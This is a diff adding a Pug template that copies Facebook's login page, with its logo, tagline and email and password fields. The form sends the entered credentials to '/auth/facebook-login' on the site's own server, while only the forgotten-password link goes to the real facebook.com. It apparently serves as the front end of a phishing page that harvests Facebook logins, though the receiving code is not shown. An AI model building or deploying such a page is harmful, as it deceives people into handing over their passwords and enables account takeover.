@@ -1,0 +1,25 @@
+doctype html
+html(lang='en')
+	head
+		meta(charset='UTF-8')
+		meta(http-equiv='X-UA-Compatible' content='IE=edge')
+		meta(name='viewport' content='width=device-width, initial-scale=1.0')
+		title Facebook - Login
+		link(rel='stylesheet' href='/css/facebook.css')
+	body
+		.container
+			div(class='left_side')
+				img(src='/img/facebook-logo.svg' height='80px')
+				h2 Facebook helps you connect and share with the people in your life.
+			div(class='right_side')
+				div(class='contact_form')
+					form(action='/auth/facebook-login' method="POST")
+						label(for='email')
+						input#email.email(type='text' name="email" placeholder='Email address or Phone number' required)
+						label(for='password')
+						input#pwd.pwd(type='password' name="password" placeholder='Password' required)
+						button.login
+							| Log In
+					a(href="https://www.facebook.com/") Forgetten password?
+					.line
+					button(class='create_account') Create New Account
